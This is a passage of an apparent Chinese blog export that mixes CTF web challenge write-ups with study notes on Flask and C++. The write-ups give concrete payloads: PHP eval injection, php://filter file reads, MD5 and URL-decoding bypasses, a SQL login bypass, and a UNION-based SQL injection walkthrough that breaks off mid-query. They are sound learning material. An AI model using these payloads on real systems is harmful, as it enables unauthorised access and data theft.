在进行对象的序列化时，只能将其属性数据、类名保存起来，而方法被忽略；在进行对象反序列化时，只要反序列化的位置有该文件，就可将对象还原]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-本地包含]]></title>
    <url>%2F2018%2F10%2F18%2FBugku-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%2F</url>
    <content type="text"><![CDATA[题目 &lt;?php include &quot;flag.php&quot;; $a = @$_REQUEST[&apos;hello&apos;]; eval( &quot;var_dump($a);&quot;); show_source(__FILE__); ?&gt;1.eval存在命令执行漏洞，构造?hello=1);var_dump(&apos;flag.php&apos;);var_dump(3即（将其整体带入$a） eval( &quot;var_dump(1);show_source(&apos;flag.php&apos;);var_dump(3);&quot;); 或 eval( &quot;var_dump(1);highlight_file(&apos;flag.php&apos;);var_dump(3);&quot;);highlight_file()与show_source()均可，两个函数功能均为给文件代码高亮显示 2.可以使用php://伪协议?hello=1);include $_POST[&apos;f&apos;];var_dump(3之后进行post传递 f=php://filter/convert.base64-encode/resource=flag.php 进行base64解码即可]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-urldecode二次编码绕过]]></title>
    <url>%2F2018%2F10%2F18%2FBugku-urldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[代码内容 &lt;?php if(eregi(&quot;hackerDJ&quot;,$_GET[id])) { echo(&quot; not allowed! &quot;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot; Access granted! &quot;; echo &quot; flag &quot;; } ?&gt;首先是进行正则匹配eregi – 不区分大小写的正则表达式匹配；之后传进一个参数id，不能为”hackerDJ”，但是经过urldecode后要等于”hackerDJ” 这里利用了两次urldecode:第一次是浏览器的解码；第二次是函数urldecode()的解码 因此将”hackerDJ”中的一个或多个字母进行两次url编码即可]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-never give up]]></title>
    <url>%2F2018%2F10%2F17%2FBugku-never-give-up%2F</url>
    <content type="text"><![CDATA[题目 查看网页源代码 发现有隐藏提示，那么返回原页面，输入网址 123.206.87.240:8006/test/1p.html发现并没有打开1p.html网页，而是打开了 查找源代码也没有找到有用信息 回到最开始的查看源代码的页面，将网址更改后， view-source:http://123.206.87.240:8006/test/1p.html发现与在原网页更改后的显示不一样 仔细观察一下，为什么网址前加上 view-source: 就变得不一样了呢？ 后来了解到，最开始访问 123.206.87.240:8006/test/1p.html 这个网址却跳到了另一个网址，这属于url重定向 URL重定向（URL redirection，或称网址重定向或网域名称转址），是指 当使用者浏览某个网址时，将他导向到另一个网址的技术此时可以加上 view-source: 来直接访问 1p.html 源码 推测网页上显示的加密为eascape，解密后发现最后有‘==’，则推测为base64加密 解码后，发现是url编码，继续解码 解出来是PHP代码 &quot;;if(!$_GET[&apos;id&apos;]) { header(&apos;Location: hello.php?id=1&apos;); exit(); } $id=$_GET[&apos;id&apos;]; $a=$_GET[&apos;a&apos;]; $b=$_GET[&apos;b&apos;]; if(stripos($a,&apos;.&apos;)) { echo &apos;no no no no no no no&apos;; return ; } $data = @file_get_contents($a,&apos;r&apos;); if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4) { require(&quot;f4l2a3g.txt&quot;); } else { print &quot;never never never give up !!!&quot;; } ?&gt;看到if有那么多比较。。。但是有个require(‘f4l2a3g.txt’)，直接更改url为 http://123.206.87.240:8006/test/f4l2a3g.txt还真的打开了]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-前女友(SKCTF)]]></title>
    <url>%2F2018%2F10%2F17%2FBugku-%E5%89%8D%E5%A5%B3%E5%8F%8B-SKCTF%2F</url>
    <content type="text"><![CDATA[题目 看起来页面上全是字，但查看源代码后发现 有个‘code.txt’链接，点进去 PHP代码审计，使用数组绕过即可]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Flask]]></title>
    <url>%2F2018%2F10%2F17%2FFlask%2F</url>
    <content type="text"><![CDATA[记录下自己学flask的过程 配置虚拟环境网上看的 虚拟环境是Python解释器的一个私有的副本，在这个环境中你可以安装私有包，而且不会影响系统中安装的全局Python解释器。虚拟环境非常的有用，可以在系统中Python解释器中避免包的混乱和版本的冲突。为每个程序单独创建虚拟环境可以保证程序只能访问虚拟环境中的包，从而保持全局解释器的干净简洁，使其只作为(更多)虚拟环境的源 为了方便配置，我使用了pycharm 在桌面创建‘flask-test.txt’文件，将其后缀修改为‘.py’，打开后，进入pycharm中file中的settings 找到Project Interpreter，点击右上角的设置logo 点击后，再点击‘Add’ 进入到这个页面，点击OK即可 之后需要安装flask这个包，进入到刚才的设置页面 点击‘+’，搜索flask，install即可 基础知识在配置好虚拟环境的py文件中写入以下代码（文件名不能是 flask.py ，因为这将与 Flask 本身冲突） 最简单的程序12345678910111213#导入了 Flask 类from flask import Flask #创建一个该类的实例app = Flask(__name__) #使用 route() 装饰器告诉 Flask 什么样的URL 能触发我们的函数。默认‘127.0.0.1:5050’@app.route('/') def start(): return 'hello world' #确保服务器只会在该脚本被 Python 解释器直接执行的时候才会运行，而不是作为模块导入的时候。if __name__ == '__main__': app.run(debug=True) 构造含有动态部分的 URL123@app.route('/user/&lt;name&gt;') def start(name): return 'hello %s' % name 尖括号中的名称为变量名，这个部分将会作为命名参数传递到你的函数，如上述定义了’/user/‘，在浏览器输入‘127.0.0.1:5050/user/gtf’时会生成‘hello gtf’这条消息 规则可以用 converter:variable_name 指定一个可选的转换器。 int 接受整数 float 但是接受浮点数 path 和默认的相似，但也接受斜线如 123@app.route('/user/&lt;int:name&gt;') def start(name): return 'hello %s' % name 此时‘user/’后不能为字符类型，只能为整数类型 唯一 URL / 重定向行为结尾有尾斜线 123@app.route('/projects/')def projects(): return 'The project page' 此时输入网址‘127.0.0.1:5050/projects’或‘127.0.0.1:5050/projects/’都会执行projects函数（不带斜线的 URL 会被 Flask 重定向到带斜线的规范 URL 去）结尾无尾斜线 123@app.route('/about')def about(): return 'The about page' 此时输入网址‘127.0.0.1:5050/about’会执行about函数，但是结尾增加一个尾斜线，会产生404错误 模板渲染引入 render_template 1from flask import render_template 可以使用 render_template() 方法来渲染模板。将模板名和你想作为关键字的参数传入模板的变量。 123456from flask import render_template@app.route('/user/&lt;name&gt;')def hello(name): return render_template('index.html', name=name) 将写好的index.html文件放在py文件同级目录下的templates文件夹（需要新建） 加载静态文件使用模板后发现加载出来的页面没有css、js、图片，需要将这些静态文件放到static文件夹下(需要新建)，放入后还要更改HTML原路径]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[字符与字符串]]></title>
    <url>%2F2018%2F10%2F14%2F%E5%AD%97%E7%AC%A6%E4%B8%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%2F</url>
    <content type="text"><![CDATA[表示方式字符用单引号引起来，如’A’；字符串用双引号引起来，如”Hello” 对于字符串常量，系统会自动在所有字符的后面加一个”\0”作为结束符 字符数组定义 char a[5];则说明，a是个字符数组，在内存中占五个字节空间如果用a来存储字符串，则最多只能有4个有效字符，必须给\0留个空间。 用字符串常量初始化字符数组：char a[]={&quot;Hello&quot;}; //char a[]=&quot;hello&quot;;注意是双引号引起来 用字符数组将整个字符串一次输入、输出：#include &lt;iostream&gt; using namespace std; int main() { char a[5]; cin &gt;&gt; a; cout &lt;&lt; a; system(&quot;pause&quot;); return 0; }此时只能输入四个有效字符 输入5个的话，会引发异常 cin.getline()输入字符串时，遇到回车或空格就会认为一个字符串的结束；如要输入含空格的字符串，就要用到cin.getline()函数 格式 cin.getline(字符数组名，字符个数，结束符)//结束符默认是&apos;\n&apos;字符串可以直接定义字符串变量 #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; int main() { string a; }求长度使用用成员方法size() cout&lt;&lt;a.size()&lt;&lt;endl;]]></content>
      <categories>
        <category>C++</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2018CTF萌新赛WP]]></title>
    <url>%2F2018%2F10%2F13%2F2018CTF%E8%90%8C%E6%96%B0%E8%B5%9BWP%2F</url>
    <content type="text"><![CDATA[就做出来一道web题（哭晕） 萌萌的小脸真可爱啊 注意：提示download 打开链接后 自动下载了一个视频，并且打开视频是一个可爱的小盆友。。。 点击网页上的“萌萌哒”， 自动下载了一个名为‘cute.jpg’的图片 由于提示是下载，那么flag应该与下载有关，视频与图片中应该不会隐藏内容 回到刚打开时的页面，查看源代码 注意到了这样一个链接‘download.php?url=Y3V0ZS5qgc=’，这个链接即为下载‘cute.jpg’时的网址 并且url后面有个‘=’，推测是base64加密的，解码 是‘cute.jpg’经过加密后的 由此可推断，改变url后的文件名，就会下载对应的文件 然后，我用‘flag.php’、‘flag.txt’经过base64加密后的内容当做url，可是。。。 看来是有限制的啊！ 后来，想到了一个很显眼的文件‘download.php’，试了一下 回车后，果然把‘download.php’给下载了下来！！！ 打开这个文件 发现有个‘fllllagg.php’，base加密后当做url下载了下来，打开，get flag！ MSC1 将下载下来的图片后缀改为‘txt’，记事本打开get flag MSC4emmm直接解压到一个‘flag.txt’文件打开就是flag了，可能是。。。 你必须要跳 打开下载解压好的文件 发现这是一串摩斯密码，在线解密一下 显示 you shoud use these ABBBB… 发现只有A与B构成，搜索了解到这是培根密码 为PEEOENNCIZHHGHAI 这应该是栅栏密码，重新排列一下 发现是拼音‘培根真好吃’ 提交‘flag{peigenzhenhaochi}即可 常用的加解密 打开后 发现有两部分信息，一部分是image/png，还有一部分应该是base64加密后的内容 将‘base64,’后面的内容复制粘贴到加密工具，发现不行 百度了一下‘data:image/png;base64’是神马意思 了解到这是一张图片经过base64加密后的代码，可以直接在HTML中使用。如果要在HTML中嵌入一张图片，那么可以指定图片的路径，还可以直接使用图片经过base加密过后的代码 创建一个HTML文件，写入下列代码（将密码.txt选中所有复制粘贴，作为src属性） 运行后，得到一张图片（还可以将密码.txt中的所有代码复制到浏览器搜索栏中，直接回车得到） 以为这就是flag，不过输入后发现不正确 那么还应该继续解密，使用凯撒解密（因为格式很想flag的格式，应该是使用凯撒加密将字母移动了一定的位数） 在第14次发现了正确的解密]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[指针]]></title>
    <url>%2F2018%2F10%2F06%2F%E6%8C%87%E9%92%88%2F</url>
    <content type="text"><![CDATA[返回值为指针类型的函数一般语法格式： 类型标识符 *函数名(参数表) { }指针变量的初始化定义的指针必须先初始化后才可使用 指针的运算假设 ptr 是一个指向地址 1000 的整型指针，是一个 32 位的整数 ptr++在执行完上述的运算之后，ptr 将指向位置 1004，因为 ptr 每增加一次，它都将指向下一个整数位置]]></content>
      <categories>
        <category>C++</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[单链表]]></title>
    <url>%2F2018%2F10%2F06%2F%E5%8D%95%E9%93%BE%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[节点链表的数据节点是一个结构体 struct node { int data;//数据域 node *next;//指针域 };成员next是指向结构体类型自身的指针（开始我也不理解为什么要这样定义，现在想明白了，指针要有个数据类型，但节点中的指针是指向下一节点的，所以数据类型就是定义的node类型。（结构体类型也属于数据类型） 单链表操作#include&lt;iostream&gt; Using namespace std; //定义一个结构体类型Node Struct Node { int data; //数据域 Node *next; //节点类型的指针域 }; Node *L; //定义一个全局类型的节点指针变量L,作为头指针 int length; //定义全局类型的单链表长度变量length void CreateList(Node *head) //后插法创建单链表 { Node *tail,*p; //定义尾指针tail，指针p head-&gt;next = NULL; //头结点初始化 tail = head; //尾指针初始化，指向头结点 for (int i = 0; i &lt; length; i++) { p = new Node; cout &lt;&lt;&quot;请输入一个整型数据: &quot; ; cin &gt;&gt; p-&gt;data; tail-&gt;next = p; //新节点插入到尾节点的后面 tail = p; //尾指针指向新节点 } tail-&gt;next = NULL; //尾节点指针域置空，表名链表结束 cout &lt;&lt;&quot;创建成功！&quot;&lt;&lt; endl; } int Insert(Node *head) //插入节点 { int position; //插入的位置 int j = 0; Node *p = head; //定义节点指针p指向头结点 Node *nnode; //生成新节点 nnode = new Node; //分配存储空间 cout &lt;&lt;&quot;请输入需要插入的值: &quot;; cin &gt;&gt; nnode-&gt;data; cout &lt;&lt;&quot;请输入需要插入到的位置: &quot;; cin &gt;&gt; position; if (position &gt; length + 1 || position &lt; 1) //如果插入的位置大于总长度+1或小于1，则结束程序 { cout &lt;&lt;&quot;插入的位置不合法！&quot;&lt;&lt; endl; return 0; } while (j &lt; position - 1) //p先指向positon-1的节点循环position-1次 { p = p-&gt;next;//第一次循环时指向第一个节点（首元结点），第二次循环时指向第二个节点... j++; } nnode-&gt;next = p-&gt;next; //设置插入的节点的指针域 p-&gt;next = nnode; //设置插入节点前的指针域 length += 1; //链表长度增加一 cout &lt;&lt;&quot;插入成功！&quot;&lt;&lt; endl; } int Remove(Node *head) //删除节点 { int position; //要删除的位置 int j = 0; Node *p = head; //定义节点指针p指向头结点 cout &lt;&lt;&quot;请输入需要删除的位置: &quot;; cin &gt;&gt; position; if (position &gt; length || position &lt; 1 || length == 0) //如果删除的位置大于总长度或小于1，则结束程序(若链表长度为0，则删除任何位置都不合法） { cout &lt;&lt;&quot;删除的位置不合法！&quot;&lt;&lt; endl; return 0; } while (j &lt; position - 1) //p先指向positon-1的节点 { p = p-&gt;next; j++; } Node *q = p-&gt;next; //p保存待删除节点的地址 p-&gt;next = q-&gt;next; //修改待删除节点前一个节点的指针域 delete q; //释放q length -= 1; //表长减一 cout &lt;&lt;&quot;删除成功！&quot;&lt;&lt; endl; } void Display(Node *head) //输出单链表 { int i = 1; Node *p = head-&gt;next;//定义节点指针p指向首元结点 while (p) //指针p不为空 { cout &lt;&lt;&quot;第&quot;&lt;&lt; i &lt;&lt;&quot;个元素为: &quot;&lt;&lt; p-&gt;data &lt;&lt; endl; p = p-&gt;next; i++; } } void Length() { cout &lt;&lt;&quot;单链表的长度为：&quot;&lt;&lt; length &lt;&lt; endl; } int Clear(Node *head) { Node *p,*q;//p用于指向下一节点，q用于保存当前待删除节点地址 p = head-&gt;next; //p指向首元结点 if (head-&gt;next == NULL) //若单链表已经为空，则不必再次进行清空操作 { cout &lt;&lt;&quot;单链表已为空！&quot;&lt;&lt; endl; return 0; } while (p) { q = p; //保存p指向的节点地址，以便清空 p = p-&gt;next; //指向下一节点 delete q; //删除保存的节点地址 } head-&gt;next = NULL; //头结点指向NULL length = 0; //单链表长度设为0 cout &lt;&lt;&quot;清空成功！&quot;&lt;&lt; endl; } int Modify(Node *head) { Node *p = head; int j = 0; int position, value; cout &lt;&lt;&quot;请输入需要修改的位置: &quot;; cin &gt;&gt; position; if (position &gt; length || position &lt; 1 || length == 0) { cout &lt;&lt;&quot;输入的位置不合法！&quot;&lt;&lt; endl; return 0; } cout &lt;&lt;&quot;请输入需要修改的值： &quot;; cin &gt;&gt; value; while (j&lt;position-1) { p = p-&gt;next; j++; } p-&gt;next-&gt;data = value; cout &lt;&lt;&quot;修改成功！&quot;&lt;&lt; endl; } int Search(Node *head) { Node *p = head; int j = 0; int position; cout &lt;&lt;&quot;请输入需要查找的位置： &quot;; cin &gt;&gt; position; if (position&lt;1 || position&gt;length || length == 0) { cout &lt;&lt;&quot;位置不合法！&quot;&lt;&lt; endl; return 0; } while (j &lt; position - 1) { p = p-&gt;next; j++; } cout &lt;&lt;&quot;位置为&quot;&lt;&lt; position &lt;&lt;&quot;的元素值为： &quot;&lt;&lt; p-&gt;next-&gt;data &lt;&lt; endl; } int main() { int options=5; cout &lt;&lt;&quot;请输入单链表的长度： &quot;; cin &gt;&gt; length; L = newNode; //初始化头指针 CreateList(L); //创建单链表 while (options != 0) { cout &lt;&lt;&quot;====================&quot;&lt;&lt; endl; cout &lt;&lt;&quot;请输入需要进行的操作，回复数字序号&quot;&lt;&lt; endl; cout &lt;&lt;&quot;0.退出操作 1.插入节点 2.删除节点 3.输出所有数据&quot;&lt;&lt; endl; cout &lt;&lt;&quot;4.输出长度 5.清空链表 6.修改元素 7.查找元素&quot;&lt;&lt; endl; cout &lt;&lt;&quot;====================&quot;&lt;&lt; endl; cin &gt;&gt; options; if (options == 0) { cout &lt;&lt;&quot;程序已退出&quot;&lt;&lt; endl; } else if (options == 1) { Insert(L); //插入新节点 } else if (options == 2) { Remove(L); //删除节点 } else if (options == 3) { Display(L); //输出单链表中的数据 } else if (options == 4) { Length(); //输出单链表的长度 } else if (options == 5) { Clear(L); //清空单链表 } else if (options == 6) { Modify(L); //修改元素 } else if (options == 7) { Search(L); //查找元素 } else { cout &lt;&lt;&quot;输入的操作序号错误！请重新输入&quot;&lt;&lt; endl; } } system(&quot;pause&quot;); return 0; }总结1.要先判断插入、删除位置是否合法在执行插入、删除操作，即要先将判断代码写到执行代码前面 2.在函数中直接cout，并且无return，即可定义函数为void；若有return 0 或return 1，则要定义函数类型为int型若要定义返回值为node类型的指针，可以这样定义： node *函数名（参数表） { }3.为了操作方便，我定义了： 全局变量头指针L：若插入节点后进行删除节点，那么在删除的时候的链表要存有刚插入的节点； 定义全局变量头指针L，则函数执行后修改了全局变量链表L，则函数调用时的链表为最新链表 链表长度length：进行添加删除节点时直接进行加减1；输出链表长度时不需遍历，直接输出length 4.指针变量在定义后，其值是随机的。也就是说该指针变量可能指向内存中某个不确定的内存单元。使用未初始化的指针变量是不安全的，可能会出现难以预料的后果，甚至使系统瘫痪。因此 定义的指针必须先初始化后才可使用如上述代码声明头指针L，但声明后不能直接传递参数给函数使用，要先分配存储空间 5.删除节点时除了要判断删除的位置是否小于1或者大于表长，还要注意判断此时链表是否为空 6.插入和删除节点相同点： 都需要插入/删除的输入位置； 都需要判断插入/删除的位置是否合法； 都要先找到待插入/删除的位置之前的节点位置7.删除节点时要先将待删除的节点位置保存在一个指针里 8. while(p) //p为指针变量 { }意思即为 while(p!=NULL) { }]]></content>
      <categories>
        <category>C++</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[结构体]]></title>
    <url>%2F2018%2F10%2F06%2F%E7%BB%93%E6%9E%84%E4%BD%93%2F</url>
    <content type="text"><![CDATA[真是头大，数据结构用c++语言表示真是太难了！还是用写博客的方式记一下c++方面的知识吧 结构体的定义及操作定义1.先定义结构体类型，再定义变量 struct student { int num; int score; }; student student1,student2; //struct student student1,student2;2.在声明类型的同时定义变量 struct student { int num; int score; }student1,student2;3.在采用声明类型的同时定义结构体变量时，可以省略结构体名 struct { int num; int score; }student1,student2;结构体类型与结构体变量的区别 1.定义结构体类型时不分配存储空间，定义结构体变量会在内存中占连续的一片存储单元 2.可以用sizeof计算一个结构体类型占的存储单元数 ...结构体变量的操作结构体变量成员的表示： 结构体变量名.成员名结构体变量初始化1.一般格式： 结构体名 变量名 = {数据}例如 #include &lt;iostream&gt; using namespace std; struct Person { int score1; int score2; }person1; int main() { person1 = { 60,70 }; cout &lt;&lt; person1.score1;//60 system(&quot;pause&quot;); return 0; }2.定义结构体类型时进行初始化 #include &lt;iostream&gt; using namespace std; struct Person { int score1; int score2; }person1 = { 60,70 }; int main() { cout &lt;&lt; person1.score1;//60 system(&quot;pause&quot;); return 0; }结构体数组如： struct student { int num; int score; }student[3];结构体数组名表示该结构体数组内存存储空间的首地址 结构体指针定义及操作struct student { int num; int score; }stu,*p; //定义结构体变量stu和结构体指针p int main() { p = &amp;stu; (*p).num = 10; cout &lt;&lt; stu.num &lt;&lt; endl; //10 cout &lt;&lt; (*p).num &lt;&lt; endl; //10 cout &lt;&lt; p-&gt;num &lt;&lt; endl; //10 }注： 1.p是结构体指针，(p)表示p指向的结构体变量stu，(p).num表示p所指的结构体变量中的成员num 2.结构体成员运算符‘.’优先于指针运算符‘*’，因此不能省略‘()’ 3.C++允许用指向运算符‘-&gt;’连接指针变量与其所指向的结构体变量的成员: 指向结构体的指针变量-&gt;成员名指向结构体数组元素的指针struct { int score1; int score2; }person[3],*p; int main() { p = person; //结构体指针p指向person[0] p-&gt;score1 = 10; cout &lt;&lt; person[0].score1 &lt;&lt; endl;//10 p++; //指向下一个结构体元素person[1] p-&gt;score1 = 20; cout &lt;&lt; person[1].score1 &lt;&lt; endl;//20 }结构体指针作为函数参数#include &lt;iostream&gt; using namespace std; struct Person { int score1; int score2; }; void hanshu(Person *p)//实参q传递给形参p，利用结构体指针p访问并输出结构体成员 { cout &lt;&lt; p-&gt;score1; } int main() { Person persons, *q; q = &amp;persons; q-&gt;score1 = 10; hanshu(q); system(&quot;pause&quot;); return 0; }typedef()的使用对一个结构体类型声明一个新名字： typedef struct //在struct之前用了关键字typedef，表示是声明新类型名 { int month; int day; int year; } TIME; //TIME是新类型名，但不是新类型，也不是结构体变量名新声明的新类型名TIME代表上面指定的一个结构体类型，这样就可以用TIME定义该结构体变量，如： TIME birthday;//定义结构体变量birthday TIME *P //p是指向该结构体类型数据的指针注意点 （1）用typedef只是对已经存在的类型增加一个类型名，而没有创造一个新的类型。只是增加了一个新名字，可以用该名字定义变量。 （2）可以用typedef声明新类型名。但是不能用来定义变量 C语言与C++的结构体知识差异1.定义结构体变量不同 struct HE { int a; };在C里面实际上数据类型为 (struct HE)，所以定义一个结构HE变量都要 带上struct. struct HE a; //C语言 结构体变量定义方式而在C++里面实际上数据类型为HE(主要是因为结构体被当成类对待了),所以定义变量不需要 struct. HE a; //C++语言 结构体变量定义方式2.动态分配内存不同 C++：可以使用new与delete运算符，也可以使用C++保留的C语言中动态分配内存的两个函数，malloc()函数和free()函数 C语言：malloc()函数和free()函数；函数被包含在malloc.h里面]]></content>
      <categories>
        <category>C++</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[南邮CTF-SQL注入1]]></title>
    <url>%2F2018%2F10%2F05%2F%E5%8D%97%E9%82%AECTF-SQL%E6%B3%A8%E5%85%A51%2F</url>
    <content type="text"><![CDATA[题目 点那个source 要用post传递参数‘user’和‘pass’，满足条件输出flag 根据form信息可知传递参数的方式是post，只需要在输入框输入参数提交即为post传参（不用使用postman） 有一条sql语句 $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;开始有点不理解，不过动手测试了一下就明白了 1为原式，2为在原式基础上去掉单引号、双引号、拼接运算符(.)，3为在原式基础上去掉拼接运算符(.) 运行结果分别为 好好意会意会。。。 由题意，user要为‘admin’，但pw不知道，不过可以跳过密码 在输入框输入 admin&apos;)#密码随意 就相当于 select user from ctf where (user=&apos;admin&apos;)# and (pw=&apos;随意密码&apos;)注： 1.sql中，#后面是注释语句，因此不会被执行，就绕过了后面检测密码的语句 2.要加一个‘）’，因为要与前面的‘（’匹配]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[南邮CTF-MYSQL]]></title>
    <url>%2F2018%2F10%2F05%2F%E5%8D%97%E9%82%AECTF-MYSQL%2F</url>
    <content type="text"><![CDATA[题目 那根据提示到robots.txt这个爬虫协议里看看 有乱码。。。那就下载下来 好吧，还是看代码吧 TIP:sql.php &lt;?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;)); if ($_GET[id]==1024) { echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; } else{ echo($query[content]); } } ?&gt;提示sql.php，说明要到这个页面进行操作 代码信息： 要用get方法传一个id参数但值要为什么呢？注意到了1024这个数字和intval()函数，输进来的数字会经过这个函数的处理 intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 输入id=1024，显示‘no！try again’输入id=1023，显示‘no msg in 1023~’输入id=1025，显示‘no more’ 那估计是1024点几 输入1024.1，正确 另： 1.mysql_connect() 函数打开非持久的 MySQL 连接。 2.mysql_select_db() 函数设置活动的 MySQL 数据库。 如果成功，则该函数返回 true。如果失败，则返回 false。 3.mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有 返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。 4.mysql_query() 函数执行一条 MySQL 查询。]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-备份是个好习惯]]></title>
    <url>%2F2018%2F10%2F05%2FBugku-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF%2F</url>
    <content type="text"><![CDATA[题目 进去之后发现是一串码 各种解密都不行 回到题目，搜了一下备份文件(.bak) 使用御剑扫描工具 发现了bak文件，点进去后下载了一个文件，打开后 相关知识： 1.$_SERVER[&quot;REQUEST_URI&quot;] 获得当前url的路径地址 2.strstr() 函数搜索字符串在另一字符串中的第一次出现，并返回字符串的剩余部分 3.substr() 返回字符串的提取部分 4.str_replace(find,replace,string,count) 参数 描述 find 必需。规定要查找的值。 replace 必需。规定替换 find 中的值的值。 string 必需。规定被搜索的字符串。 5.parse_str() 函数把查询字符串解析到变量中。即： include_once &quot;flag.php&quot;; ini_set(&quot;display_errors&quot;, 0); $str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);//获取 ?参数 $str = substr($str,1);//去掉?,获取参数 $str = str_replace(&apos;key&apos;,&apos;&apos;,$str);//将参数中的key替换为空字符串 parse_str($str);//将字符串解析到变量 echo md5($key1);// echo md5($key2); //判断，为1返回flag if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){ echo $flag.&quot;取得flag&quot;; } ?&gt;说明替换key后存在$key1和$key2两个变量，可以构造kekeyy1和kekeyy2，替换key后后就有key1和key2这两个变量了； 由于是md5判断，则可以传数组绕过;还可以加密后为0e判断绕过 可以设参数为 ?kekeyy1[]=1&amp;kekeyy2[]=2或 ?kekeyy1=s214587387a&amp;kekeyy2=s1091221200a得到flag]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-管理员系统]]></title>
    <url>%2F2018%2F10%2F04%2FBugku-%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[题目： 随便输入后 则估计要用ip绕过（使用X-Forwarded-For) 查看源代码 注意到了右边的滚动条很长，拉到最后 发现一条注释，内容应该是经过base64加密的，因为最后是‘==’ 解码 这是啥呢？ 先使用burpsuit，随便输入账号密码，构造 X-Forwarded_For: 127.0.0.1发现行不通 之后就不知道怎么办了，问了度娘后，发现登录账号是‘admin’，密码是‘test123’ 就得到了flag。。。 回过来看这道题，为啥自己想不到账号密码 再看一下题目信息 管理员系统 IP禁止访问，请联系本地管理员登陆，IP已被记录.有‘管理员’这个词（联想到admin） 看来做题还要会猜啊]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-成绩查询]]></title>
    <url>%2F2018%2F10%2F04%2FBugku-%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[学了MySQL的基础知识后，发现做sql注入类的题没一点思路，还是要刷题啊~ 题目： 依次输入1,2,3后，出来了三份不同的成绩单，输入3的成绩单如下： 不过输入&gt;=4的值后，就只有表没有信息了 不管输入什么值，url没有任何改变，则注入时使用post方法 打开postman（因为我使用的是Chrome），用post方法传递参数id，会发现id分别为1,2,3时与输入框分别输入1,2,3效果一样 如传递的参数为‘id=2’时 接下来就开始找表的列数（union查询需要用到），由于有人名、数学、英语、语文这四个变量，先尝试4,id的值为 1&apos;order by 4#相当于 SELECT 名字,数学成绩,英语成绩,语文成绩 FROM users WHERE user_id = &apos;1&apos; order by 4#&apos;;显示为 order by 4:按第四字段排行 解释一下，如，hello表中有四条数据： 若要按照年龄大小从小到大排序 因为age位于第三列，因此只需‘order by 3’（默认从小到大排序） 如果超过这个列，就会报错 回到这个题，让id的值为 1&apos;order by 5#显示为 则可以确定一共有四列，则可以使用union联合查询，获取当前使用的数据库名，使id的参数为 0&apos;union select 1,2,3,database()#注： 使用 union 查询的时候需要和主查询的列数相同！！！ 解释： 这条语句相当于 SELECT first_name, last_name FROM users WHERE user_id = &apos;0&apos; union select 1,2,3,database()#&apos;;让user_id=’0’，目的是置空表的数据 因为表有四列，因此使用union要查询四个信息，目的想获取当前使用的数据库名，就使用database()这个函数，其他的select 1,2,3就是充数用的。。。如， 并没有卵用。。。 回到本题，请求后显示出了当前数据库名 接下来要获取skctf_flag中的数据表 information_schema 是 mysql 自带的一张表，这张数据表保存了 Mysql 服务器所有数据库的信息 ,如数据库名，数据库的表，表栏的数据类型与访问权限等。 该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema， 分别记录 DBMS 中的存储的表名和表名所在的数据库。运用此知识获取，让id参数为： 0&apos;union select 1,2,3,table_name from information_schema.tables where table_schema=&apos;skctf_flag&apos;#即获取当数据库为‘skctf_flag’时的表的名字 查到了表为‘fl4g’，接下来找表的列名 0&apos;union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&apos;fl4g&apos;#即表名为‘fl4g’时的列名 注：group_concat() : 将由不同栏位获得的字符串连在一起 如， 在表hello中，有如下数据 不使用group_concat()时， 使用时 即将所有列名的字符串连在了一起 得到： 即只有一列，列名为‘skctf_flag’ 最后一步，找数据 0&apos;union select 1,2,3,skctf_flag from 